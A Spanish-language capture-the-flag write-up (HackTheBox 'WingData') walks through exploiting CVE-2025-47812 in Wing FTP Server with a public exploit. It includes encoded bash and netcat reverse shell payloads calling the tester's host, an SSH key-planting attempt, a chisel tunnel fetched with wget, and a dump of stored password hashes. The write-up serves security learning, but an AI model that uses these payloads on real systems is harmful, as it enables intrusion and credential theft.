+  </div>
+</div>
+
+  
+
+  
+
+  
+    <div class="mb-5"></div>
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-10">
+            <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Tabla de contenido
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#nmap-scan">Nmap Scan</a></li>
+      </ul>
+    </li>
+    <li><a href="#puerto-80">Puerto 80</a></li>
+    <li><a href="#subdominio-ftp">Subdominio <code>ftp</code></a>
+      <ul>
+        <li><a href="#intentos-fallidos-de-reverse-shell-y-ssh">Intentos fallidos de Reverse Shell y SSH</a></li>
+        <li><a href="#intento-exitoso-de-reverse-shell">Intento exitoso de Reverse Shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#privesc">Privesc</a>
+      <ul>
+        <li><a href="#puerto-5466---panel-admin">Puerto 5466 - Panel Admin</a></li>
+        <li><a href="#conexión-por-ssh-wacky">Conexión por SSH, Wacky</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Tabla de contenido
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#nmap-scan">Nmap Scan</a></li>
+      </ul>
+    </li>
+    <li><a href="#puerto-80">Puerto 80</a></li>
+    <li><a href="#subdominio-ftp">Subdominio <code>ftp</code></a>
+      <ul>
+        <li><a href="#intentos-fallidos-de-reverse-shell-y-ssh">Intentos fallidos de Reverse Shell y SSH</a></li>
+        <li><a href="#intento-exitoso-de-reverse-shell">Intento exitoso de Reverse Shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#privesc">Privesc</a>
+      <ul>
+        <li><a href="#puerto-5466---panel-admin">Puerto 5466 - Panel Admin</a></li>
+        <li><a href="#conexión-por-ssh-wacky">Conexión por SSH, Wacky</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          <ul>
+<li>Dificultad: <code>easy</code></li>
+<li>Tiempo aprox. <code>~5.5h</code></li>
+<li><strong>Datos Iniciales</strong>: <code>10.129.4.246</code></li>
+</ul>
+
+<h3 class="relative group">Nmap Scan
+    <div id="nmap-scan" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#nmap-scan" aria-label="Ancla">#</a>
+    </span>
+    
+</h3>
+<p>Tras realizar un escaneo nmap completo, se encuentran los siguientes puertos abiertos:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sVC -sT -Pn -n -p22,80 10.129.4.246      
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-02-15 11:20 -0500
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.4.246
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.045s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.66
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.66 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://wingdata.htb/
+</span></span><span style="display:flex;"><span>Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nada en UDP</span></span></span></code></pre></div></div>
+
+<h2 class="relative group">Puerto 80
+    <div id="puerto-80" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#puerto-80" aria-label="Ancla">#</a>
+    </span>
+    
+</h2>
+<p>Al entrar al puerto 80, encontramos una página web que habla sobre compartición de archivos:</p>
+<blockquote><p>&ldquo;<em>At Wing Data Solutions, we’re redefining how teams share and protect data online. Our encrypted platform combines speed, simplicity, and enterprise-grade security — so you can transfer files with total confidence, anywhere in the world.</em>&rdquo;</p>
+</blockquote><p>Varios de los botones que aparecen no llevan a ningún sitio, salvo el que dice <strong><code>Client Portal</code></strong>, que nos lleva a <code>ftp.wingdata.htb</code>.</p>
+<blockquote><p>De nuevo, podíamos imaginar que existía un subdominio dado que en nmap se nos mostraba que la máquina hacía uso de vhosts (<code>Did not follow redirect to http://wingdata.htb/</code>), lo que hacía probable que existiesen más (si no, para qué serviría usar un vhost principal <code>wingdata.htb</code>?).</p>
+</blockquote><p>Antes de entrar a <code>ftp.wingdata.htb</code>, probamos a enumerar otros vhosts.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster vhost --url http://wingdata.htb --wordlist /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt --append-domain --xs 301
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.8.2
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in VHOST enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>ftp.wingdata.htb Status: <span style="color:#ae81ff">200</span> <span style="color:#f92672">[</span>Size: 678<span style="color:#f92672">]</span></span></span></code></pre></div></div>
+<p>No encontramos nada más, así que de momento añadimos <code>ftp.wingdata.htb</code> a <code>/etc/hosts</code> y entramos al subdominio.</p>
+
+<h2 class="relative group">Subdominio <code>ftp</code>
+    <div id="subdominio-ftp" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#subdominio-ftp" aria-label="Ancla">#</a>
+    </span>
+    
+</h2>
+<p>Al entrar a <code>http://ftp.wingdata.htb</code>, encontramos un panel de login de WingFTP, con versión <code>Wing FTP Server v7.4.3</code>. Si buscamos esta versión, vemos que es vulnerable a <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47812"  target="_blank" rel="noreferrer"><code>CVE-2025-47812</code></a> (Unauthenticated RCE).</p>
+<blockquote><p>Según el NVD: <em>In Wing FTP Server before 7.4.4. the user and admin web interfaces mishandle &lsquo;\0&rsquo; bytes, ultimately allowing injection of arbitrary Lua code into user session files. This can be used to execute arbitrary system commands with the privileges of the FTP service (root or SYSTEM by default). This is thus a remote code execution vulnerability that guarantees a total server compromise. This is also exploitable via anonymous FTP accounts.</em></p>
+</blockquote><p>Tenemos disponibles exploits públicos para esta vulnerabilidad, como <a href="https://www.exploit-db.com/exploits/52347"  target="_blank" rel="noreferrer">este</a>. Lo descargamos y ejecutamos:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 52347.py -u http://ftp.wingdata.htb 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Testing target: http://ftp.wingdata.htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> http://ftp.wingdata.htb is vulnerable!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ python3 52347.py -u http://ftp.wingdata.htb -c <span style="color:#e6db74">&#34;whoami&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Testing target: http://ftp.wingdata.htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sending POST request to http://ftp.wingdata.htb/loginok.html with command: <span style="color:#e6db74">&#39;whoami&#39;</span> and username: <span style="color:#e6db74">&#39;anonymous&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> UID extracted: 984873a4a52f6bea507f0b0de77b31f2f528764d624db129b32c21fbca0cb8d6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 984873a4a52f6bea507f0b0de77b31f2f528764d624db129b32c21fbca0cb8d6
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- Command Output ---
+</span></span><span style="display:flex;"><span>wingftp
+</span></span><span style="display:flex;"><span>----------------------</span></span></code></pre></div></div>
+<p>Mediante el RCE sacamos algo de info antes de intentar conseguir un reverse shell:</p>
+<ul>
+<li>Dump de <code>/etc/passwd</code>: usuarios interactivos <code>root</code>, <code>wingftp</code>, <code>wacky</code>.</li>
+<li><code>wingftp</code> usa <code>bash</code> como shell, pero no tiene directorio en <code>/home</code>, sino en <code>/opt/wingftp</code></li>
+<li>Ubicación del servidor web en <code>/opt/wftpserver</code></li>
+</ul>
+
+<h3 class="relative group">Intentos fallidos de Reverse Shell y SSH
+    <div id="intentos-fallidos-de-reverse-shell-y-ssh" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#intentos-fallidos-de-reverse-shell-y-ssh" aria-label="Ancla">#</a>
+    </span>
+    
+</h3>
+<p>Al principio intento conseguir un reverse shell mediante el RCE, pero parece no funcionar:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat shell         
+</span></span><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.15.141/4444 0&gt;&amp;1&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ cat shell | base64
+</span></span><span style="display:flex;"><span>YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNDEvNDQ0NCAwPiYxJwo<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ python3 52347.py -u http://ftp.wingdata.htb -c <span style="color:#e6db74">&#34;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNDEvNDQ0NCAwPiYxJwo= | base64 -d | bash 2&gt;/dev/null&#34;</span> 
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>--- Command Output ---
+</span></span><span style="display:flex;"><span>session expired
+</span></span><span style="display:flex;"><span>----------------------</span></span></code></pre></div></div>
+<p>Pasado un rato probando alternativas de revshell, pruebo a crear un par de claves de ssh, dado que, aunque el usuario <code>wingftp</code> no tiene directorio en <code>/home</code> sí tiene uno en <code>opt/wingftp</code>, es posible crearlas sin necesitar permisos sudo.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat wingdataKEY.pub| base64
+</span></span><span style="display:flex;"><span>c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUJmSDdibXZTbEVGWEZqd3piWSs4N0wwdjhPVS94TmlJQ1JxNUVMOFdJVzYga2FsaUBrYWxpCg<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c <span style="color:#e6db74">&#39;mkdir -p /opt/wingftp/.ssh &amp;&amp; echo c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUJmSDdibXZTbEVGWEZqd3piWSs4N0wwdjhPVS94TmlJQ1JxNUVMOFdJVzYga2FsaUBrYWxpCg== | base64 -d &gt;&gt; /opt/wingftp/.ssh/authorized_keys&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- Command Output ---
+</span></span><span style="display:flex;"><span>session expired
+</span></span><span style="display:flex;"><span>----------------------</span></span></code></pre></div></div>
+<p>Tampoco parece funcionar.</p>
+
+<h3 class="relative group">Intento exitoso de Reverse Shell
+    <div id="intento-exitoso-de-reverse-shell" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#intento-exitoso-de-reverse-shell" aria-label="Ancla">#</a>
+    </span>
+    
+</h3>
+<p>Tras intentarlo un rato largo (~1h) intentando distintas configuraciones y evitando comillas y caracteres especiales, pruebo a hacer URL encoding de todo el payload:</p>
+<ol>
+<li>Tomo <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.15.141 4444 &gt;/tmp/f</code> y lo paso a base64:</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.15.141 4444 &gt;/tmp/f&#39;</span> | base64</span></span></code></pre></div></div>
+<ol start="2">
+<li>Creo el payload con el reverse shell dentro en base64:</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEwLjE1LjE0MSA0NDQ0ID4vdG1wL2YK | base64 -d | bash &amp; disown</span></span></code></pre></div></div>
+<ol start="3">
+<li>Encodeo todo a url (con [URLEncoder]](<a href="https://www.urlencoder.org/%29%29"  target="_blank" rel="noreferrer">https://www.urlencoder.org/))</a>, queda:</li>
+</ol>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-url" data-lang="url">echo%20cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEwLjE1LjE0MSA0NDQ0ID4vdG1wL2YK%20%7C%20base64%20-d%20%7C%20bash%20%26%20disown</code></pre></div>
+<ol start="4">
+<li>Mandamos el payload:</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 52347.py -u http://ftp.wingdata.htb -c <span style="color:#e6db74">&#39;echo%20cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEwLjE1LjE0MSA0NDQ0ID4vdG1wL2YK%20%7C%20base64%20-d%20%7C%20bash%20%26%20disown&#39;</span>
+</span></span><span style="display:flex;"><span>...</span></span></code></pre></div></div>
+<ol start="5">
+<li>Mientras tanto, en otra terminal:</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ penelope -i 10.10.15.141                                                    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listening <span style="color:#66d9ef">for</span> reverse shells on 10.10.15.141:4444 
+</span></span><span style="display:flex;"><span>➤ Main Menu <span style="color:#f92672">(</span>m<span style="color:#f92672">)</span> Payloads <span style="color:#f92672">(</span>p<span style="color:#f92672">)</span> Clear <span style="color:#f92672">(</span>Ctrl-L<span style="color:#f92672">)</span>  Quit <span style="color:#f92672">(</span>q/Ctrl-C<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Got reverse shell from wingdata~10.129.5.169-Linux-x86_64 Assigned SessionID &lt;1&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Attempting to upgrade shell to PTY...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Shell upgraded successfully using /usr/local/bin/python3!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Interacting with session <span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>, Shell Type: PTY, Menu key: F12
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wingftp@wingdata:/opt/wftpserver$ whoami
+</span></span><span style="display:flex;"><span>wingftp</span></span></code></pre></div></div>
+
+<h2 class="relative group">Privesc
+    <div id="privesc" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#privesc" aria-label="Ancla">#</a>
+    </span>
+    
+</h2>
+<p>Al entrar, vemos que somos el usuario <code>wingftp</code>, que el flag de user está (seguramente) en <code>/home/wacky</code>, directorio para el que no tenemos permisos, y que nuestro directorio $HOME <code>/opt/wingftp</code> no existía.</p>
+<p>Al ejecutar LinPEAS, aparecen bastantes datos marcados como <strong>95%PE</strong> que parecen ser falsos positivos y LinPEAS marcándose a sí mismo, así que nos centramos en los puertos abiertos:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:43143           0.0.0.0:*               LISTEN      3555/wftpserver     
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:5466            0.0.0.0:*               LISTEN      3555/wftpserver     
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8080          0.0.0.0:*               LISTEN      3555/wftpserver     
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::5466                 :::*                    LISTEN      3555/wftpserver</span></span></code></pre></div></div>
+<p>De aquí destacan 2 puertos: <code>0.0.0.0:5466</code> (según Internet, el panel de administración de WinFTP), Y <code>127.0.0.1:8080</code> (Un posible servidor web, aunque no lo sabemos).</p>
+
+<h3 class="relative group">Puerto 5466 - Panel Admin
+    <div id="puerto-5466---panel-admin" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#puerto-5466---panel-admin" aria-label="Ancla">#</a>
+    </span>
+    
+</h3>
+<blockquote><p><em>Aunque el 5466 está en escucha en todas las interfaces, es posible que haya un firewall bloqueando las conexiones entrantes de fuera a este puerto, pues en el análisis inicial no ha aparecido y si intentamos conectarnos ahora tampoco podemos, solo si hacemos curl desde la propia máquina a través del reverse shell.</em></p>
+</blockquote><p>Como el directorio $HOME de nuestro usuario no existe y no tenemos permisos para crearlo, no podemos crear claves SSH y no podemos hacer port forwarding directo, aunque podemos intentar hacerlo de forma inversa abriendo un servidor ssh en nuestra máquina kali:</p>
+<p>Desde la máquina vulnerable:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -N -R 5466:127.0.0.1:5466 kali@10.10.15.141
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Se queda pillado y no pide contraseña</span></span></span></code></pre></div></div>
+<p>No parece funcionar, quizás por algún problema con el reverse shell no puede pedir la contraseña y no podemos hacer el túnel. Probamos con otra herramienta para lo mismo, <a href="https://github.com/jpillora/chisel"  target="_blank" rel="noreferrer">chisel</a>.</p>
+<p>Movemos <code>chisel</code> a la máquina vulnerable:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wingftp@wingdata:/tmp/tests$ wget http://10.10.15.141:8000/chisel_bin
+</span></span><span style="display:flex;"><span>--2026-02-15 14:04:53--  http://10.10.15.141:8000/chisel_bin
+</span></span><span style="display:flex;"><span>Connecting to 10.10.15.141:8000... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">10240184</span> <span style="color:#f92672">(</span>9.8M<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: ‘chisel_bin’
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chisel_bin                                       100%<span style="color:#f92672">[==========================================================================================================</span>&gt;<span style="color:#f92672">]</span>   9.77M  5.85MB/s    in 1.7s    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2026-02-15 14:04:55 <span style="color:#f92672">(</span>5.85 MB/s<span style="color:#f92672">)</span> - ‘chisel_bin’ saved <span style="color:#f92672">[</span>10240184/10240184<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wingftp@wingdata:/tmp/tests$ ls
+</span></span><span style="display:flex;"><span>chisel_bin</span></span></code></pre></div></div>
+<p>Ponemos nuestra máquina en escucha:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./chisel_bin server -p <span style="color:#ae81ff">8000</span> --reverse
+</span></span><span style="display:flex;"><span>2026/02/15 14:06:17 server: Reverse tunnelling enabled
+</span></span><span style="display:flex;"><span>2026/02/15 14:06:17 server: Fingerprint GpgQ+i2sPNotNKr/DctUl6X3k7GirxJDxNtXxQtuwhI<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>2026/02/15 14:06:17 server: Listening on http://0.0.0.0:8000
+</span></span><span style="display:flex;"><span>2026/02/15 14:06:42 server: session#1: tun: proxy#R:5466<span style="color:#f92672">=</span>&gt;5466: Listening</span></span></code></pre></div></div>
+<p>Y conectamos desde el servidor:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wingftp@wingdata:/tmp/tests$ chmod +x chisel_bin 
+</span></span><span style="display:flex;"><span>wingftp@wingdata:/tmp/tests$ ./chisel_bin client 10.10.15.141:8000 R:5466:127.0.0.1:5466
+</span></span><span style="display:flex;"><span>2026/02/15 14:06:42 client: Connecting to ws://10.10.15.141:8000
+</span></span><span style="display:flex;"><span>2026/02/15 14:06:42 client: Connected <span style="color:#f92672">(</span>Latency 38.505876ms<span style="color:#f92672">)</span></span></span></code></pre></div></div>
+<p>Y aquí llegamos al panel de admin.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt=""
+    width="1264"
+    height="708"
+    src="/writeups/wingdata/adminWingFTP_hu_6650be7912393b0e.png"
+    srcset="/writeups/wingdata/adminWingFTP_hu_6650be7912393b0e.png 800w, /writeups/wingdata/adminWingFTP.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeups/wingdata/adminWingFTP.png"></figure>
+</p>
+<p>Necesitamos credenciales, así que las buscamos en el dispositivo. Tras una búsqueda, encontramos los archivos <code>admins.xml</code>, <code>anonymous.xml</code>, <code>john.xml</code>, <code>maria.xml</code>, <code>steve.xml</code> y <code>wacky.xml</code>:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wingftp@wingdata:/opt/wftpserver$ grep -r <span style="color:#e6db74">&#39;&lt;/Password&gt;&#39;</span> 
+</span></span><span style="display:flex;"><span>Data/_ADMINISTRATOR/admins.xml:        &lt;Password&gt;a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba&lt;/Password&gt;
+</span></span><span style="display:flex;"><span>Data/1/users/maria.xml:        &lt;Password&gt;a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03&lt;/Password&gt;
+</span></span><span style="display:flex;"><span>Data/1/users/steve.xml:        &lt;Password&gt;5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca&lt;/Password&gt;
+</span></span><span style="display:flex;"><span>Data/1/users/wacky.xml:        &lt;Password&gt;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca&lt;/Password&gt;
+</span></span><span style="display:flex;"><span>Data/1/users/anonymous.xml:        &lt;Password&gt;d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca&lt;/Password&gt;
